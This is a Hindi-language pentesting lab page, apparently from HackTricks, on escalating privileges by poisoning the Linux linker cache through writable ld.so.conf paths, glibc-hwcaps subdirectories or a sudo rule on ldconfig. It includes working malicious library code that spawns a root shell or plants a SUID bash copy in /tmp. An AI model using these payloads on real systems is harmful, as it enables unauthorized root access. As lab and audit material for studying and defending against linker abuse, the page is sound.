# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

यह पेज **`/etc/ld.so.conf` या `ldconfig` के माध्यम से system linker cache को poison करने** के लिए एक focused lab है। Missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD`, और अन्य generic SUID linker abuse के लिए [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) देखें।

## Environment तैयार करें

निम्नलिखित section में उन files का code दिया गया है, जिनका उपयोग हम environment तैयार करने के लिए करेंगे।

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. अपनी machine में उसी folder में वे **files Create** करें
2. **library को Compile** करें: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` को `/usr/lib` में **Copy** करें और cache refresh करें: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **executable को Compile** करें: `gcc sharedvuln.c -o sharedvuln -lcustom`

### environment को Check करें

जाँचें कि _libcustom.so_ को _/usr/lib_ से **load** किया जा रहा है और आप binary को **execute** कर सकते हैं।
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### उपयोगी triage commands

किसी वास्तविक target पर attack करते समय, **exact library name** को verify करें जिसकी binary को आवश्यकता है, यह देखें कि loader **वर्तमान में क्या resolve कर रहा है**, और live cache को mutate किए बिना कौन-से configured paths writable हैं।<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` का उपयोग केवल किसी **विश्वसनीय** executable पर करें। कुछ implementations या असामान्य ELF interpreters के कारण यह attacker-controlled code execute कर सकता है; `objdump -p ./file | grep NEEDED` direct dependencies की सुरक्षित सूची देता है। किसी trusted target के लिए, मिले हुए interpreter को `--list` के साथ चलाने पर actual resolution दिखाई देती है।<sup>[[4]](#references)</sup>

कुछ उपयोगी सावधानियां:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` आमतौर पर **काम नहीं करता**, क्योंकि
redirection आपके वर्तमान shell द्वारा किया जाता है। इसके बजाय
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` का उपयोग करें।
- **SUID/privileged** binaries **secure-execution mode** में चलती हैं: `LD_LIBRARY_PATH`
को ignore किया जाता है, जबकि `LD_PRELOAD` restricted होता है (slash वाले names
को ignore किया जाता है, और केवल standard directories में मौजूद setuid-marked libraries
को preload किया जा सकता है)। एक बार root द्वारा `ldconfig` चलाए जाने पर,
`/etc/ld.so.conf` में सूचीबद्ध directories `/etc/ld.so.cache` में शामिल हो सकती हैं, इसलिए
यह misconfiguration अभी भी privileged programs को प्रभावित कर सकती है।<sup>[[1]](#references)[[2]](#references)</sup>
- `/etc/suid-debug` मौजूद होने तक secure-execution mode में `LD_DEBUG` को भी ignore किया जाता है, इसलिए
privileged execution से output की अपेक्षा करने के बजाय किसी equivalent non-SUID run से उसका trace
collect करें।<sup>[[1]](#references)</sup>
- glibc 2.33 और उसके बाद के versions में dynamic loader
`--list-diagnostics` भी expose करता है, जो hijack के अपेक्षित तरीके से काम न करने पर
machine-readable loader diagnostics और built-in search-path information print करता है।<sup>[[1]](#references)[[6]](#references)</sup>

### Cache और SONAME constraints

`ldconfig` configured directory में मौजूद हर arbitrary file को cache नहीं करता: यह ELF headers की जांच करता है, `lib*.so*` या `ld-*.so*` से match होने वाले names को पहचानता है, और conventional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain की अपेक्षा करता है। इसलिए injected object में target architecture/class, exact `DT_NEEDED` name (आमतौर पर उसका `DT_SONAME`), और victim द्वारा resolve किए जाने वाले सभी symbols/versions होने चाहिए।<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefer किसी target-specific library का उपयोग करें, जैसा कि इस उदाहरण में है। किसी incomplete object के साथ common SONAME को shadow करने से वह प्रत्येक process टूट सकता है जो intended privileged target के चलने से पहले उसे resolve करता है।<sup>[[3]](#references)</sup>

## Exploit

इस scenario में मान लें कि किसी administrator ने `/etc/ld.so.conf.d/` के अंतर्गत किसी file में एक vulnerable entry जोड़ दी है, जिसे system की
`/etc/ld.so.conf` include करती है।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Vulnerable folder _/home/ubuntu/lib_ है (जहां हमारे पास लिखने की अनुमति है)।\
**Download और compile** निम्नलिखित code को उस path के अंदर करें:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
यदि आप अपेक्षा करते हैं कि **root** (या कोई अन्य privileged account) बाद में vulnerable binary को execute करेगा, तो आमतौर पर interactive shell spawn करने के बजाय **root-owned artifact** छोड़ना बेहतर होता है। उदाहरण के लिए:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
फिर, privileged execution होने के बाद, आप `/tmp/rootbash -p` का उपयोग कर सकते हैं।

अब जब हमने **misconfigured** path के अंदर malicious libcustom library **बना दी है**, तो default cache को सफल privileged **`ldconfig`** run द्वारा फिर से बनाया जाना आवश्यक है। Reboot केवल तभी मदद करता है जब local boot process वास्तव में इसे invoke करे; अन्यथा administrator की कार्रवाई की प्रतीक्षा करें या यदि उपलब्ध हो, तो unsafe sudo rule का उपयोग करें।<sup>[[2]](#references)</sup>

ऐसा होने के बाद, **फिर से जाँचें** कि `sharedvuln` executable `libcustom.so` library को कहाँ से load कर रहा है:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
जैसा कि आप देख सकते हैं, यह इसे **`/home/ubuntu/lib` से लोड कर रहा है** और यदि कोई user इसे execute करता है, तो एक shell execute होगा:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> ध्यान दें कि इस उदाहरण में हमने privileges escalate नहीं किए हैं, लेकिन executed commands को modify करके और **root या किसी अन्य privileged user द्वारा vulnerable binary execute किए जाने की प्रतीक्षा करके**, हम escalate privileges कर पाएंगे।

### Modern `glibc-hwcaps` shadowing

glibc 2.33 से, loader **हर library search directory** के अंदर `glibc-hwcaps/<level>/` के नीचे मौजूद optimized libraries को प्राथमिकता दे सकता है। इसलिए केवल `/home/ubuntu/lib` की जाँच करना पर्याप्त नहीं है: `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` जैसी writable compatible subdirectory, `ldconfig` द्वारा index किए जाने के बाद base library को shadow कर सकती है, जबकि अन्य CPUs base object का उपयोग करते रहते हैं। इससे architecture-selective hijack भी संभव होता है, जो किसी अलग CPU पर validation होने पर छूट सकता है।<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
वर्तमान glibc hardening guidance duplicate SONAMEs, non-default search locations और `glibc-hwcaps` subdirectories में मौजूद objects से बचने की सलाह देती है। Audit के दृष्टिकोण से, configured directories और उनके parent path components पर ownership और writeability checks recursively लागू करें।<sup>[[3]](#references)</sup>

### अन्य misconfigurations - वही vuln

पिछले उदाहरण में हमने एक misconfiguration का दिखावा किया था, जिसमें administrator ने **`/etc/ld.so.conf.d/` के अंदर मौजूद configuration file में एक non-privileged folder सेट किया था**।\
लेकिन ऐसी अन्य misconfigurations भी हैं जो वही vulnerability उत्पन्न कर सकती हैं: यदि आपके पास loaded **config file** में **write permissions** हैं, आप writable `/etc/ld.so.conf.d/` directory में कोई file बना सकते हैं, या `/etc/ld.so.conf` में लिख सकते हैं, तो आप वही vulnerability configure और exploit कर सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**मान लें कि आपके पास `ldconfig` पर sudo privileges हैं**।\
आप `-f` के साथ `ldconfig` को **कौन-सी configuration file पढ़नी है, यह बता सकते हैं**, इसलिए attacker-controlled directories का नाम रखने वाली file `ldconfig` को उन folders को cache में जोड़ने के लिए बाध्य कर सकती है।<sup>[[2]](#references)</sup>\
तो, `"/tmp"` को load करने के लिए आवश्यक files और folders बनाते हैं:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
अब, जैसा कि **previous exploit** में बताया गया है, **malicious library को `/tmp` के अंदर बनाएं**।\
और अंत में, path को load करें और जांचें कि binary library को कहां से load कर रही है:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**जैसा कि आप देख सकते हैं, `ldconfig` पर sudo privileges होने पर आप उसी vulnerability का exploit कर सकते हैं। सीमित sudo rule का आकलन करते समय options का विवरण महत्वपूर्ण होता है: `-f` दूसरी configuration चुनता है, लेकिन फिर भी `/etc/ld.so.cache` को rebuild करता है; `-C` cache को किसी अन्य स्थान पर redirect करता है; `-N` cache rebuilding को रोकता है; और `-X` link updates को रोकता है, लेकिन **`-N` के साथ उपयोग किए जाने तक cache को फिर भी rebuild करता है**।**<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
